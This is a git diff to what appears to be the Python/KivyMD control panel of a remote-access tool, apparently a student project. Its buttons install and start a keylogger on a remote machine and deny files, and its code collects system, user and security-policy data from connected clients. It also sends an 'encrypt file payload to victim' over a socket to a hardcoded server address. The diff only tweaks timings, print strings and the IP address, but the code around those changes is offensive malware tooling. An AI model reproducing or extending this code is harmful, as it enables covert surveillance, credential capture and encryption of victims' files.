@@ -103,7 +103,6 @@ ScreenManager:
                     id: firewallBtn
                     text: "Firewall"
                     on_press: app.Firewall()
-
                 OneLineListItem:
                     id: denyFileBtn
                     text: "Deny Files"
@@ -112,17 +111,14 @@ ScreenManager:
                     id: openBrowser
                     text: "Open Browsers"
                     on_press: app.OpenBrowsers()
-
                 OneLineListItem:
                     id: instkeyloggerBtn
                     text: "Install Key Logger"
                     on_press: app.KeyloggerInstall()
-
                 OneLineListItem:
                     id: keyloggerBtn
                     text: "Key Logger Start"
                     on_press: app.KeyloggerInit()
-
                 OneLineListItem:
                     id: keyloggerstopBtn
                     text: "Key Logger Stop"
@@ -161,7 +157,7 @@ ScreenManager:
         hint_text: 'Enter File Path'
 '''
 # Server IP and Port
-HOST = '192.168.221.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
+HOST = '192.168.123.165'  # Temporary localhost for testing (Make sure to use the client's IP during production
 PORT = 21420
 
 
@@ -201,6 +197,7 @@ class Main(MDApp):
     # This is to gather the client's information about their network
     def NetworkInfo(self):
         while True:
+            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -219,6 +216,7 @@ class Main(MDApp):
     # Gather Operating System Information
     def OSInfo(self):
         while True:
+            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -251,6 +249,7 @@ class Main(MDApp):
 
     def GpuInfo(self):
         while True:
+            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -286,6 +285,7 @@ class Main(MDApp):
     # Get the % of CPU Utilization
     def CpuUsage(self):
         while True:
+            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -303,6 +303,7 @@ class Main(MDApp):
     # Get current running tasks
     def Tasks(self):
         while True:
+            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -322,6 +323,7 @@ class Main(MDApp):
     # Get current running services
     def Services(self):
         while True:
+            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -339,6 +341,7 @@ class Main(MDApp):
     # Get security policy
     def SecPolicy(self):
         while True:
+            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -356,6 +359,7 @@ class Main(MDApp):
     # Get memory information
     def MemInfo(self):
         while True:
+            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -380,7 +384,7 @@ class Main(MDApp):
             output3 = self.currConn.recv(int(recvsize3)).decode()
 
             # Print result
-            print('Output: \n')
+            print('Output:')
             print(output)
             print(output2)
             print(output3)
@@ -389,6 +393,7 @@ class Main(MDApp):
     # Fang's stuffz
     def UserInfo(self):
         while True:
+            time.sleep(1)
             # Reset console
             self.root.ids.consoleField.text = ''
 
@@ -560,7 +565,7 @@ class Main(MDApp):
 
                 # File transfer mode
                 self.currConn.send("ft_True".encode())
-                time.sleep(0.02)
+                time.sleep(0.05)
 
                 # Send target path and size of file
                 self.currConn.send(str("echo " + tpath).encode())
@@ -643,11 +648,11 @@ class Main(MDApp):
 
             # Send payload to target if it isn't there yet
             if isExist.strip() == "False":
-                print("Sending encryptfile payload to victim.")
+                print("Sending encrypt file payload to victim.")
 
                 # File transfer mode
                 self.currConn.send("ft_True".encode())
-                time.sleep(0.02)
+                time.sleep(0.5)
 
                 # Send target path and size of file
                 self.currConn.send(str("echo " + tpath).encode())
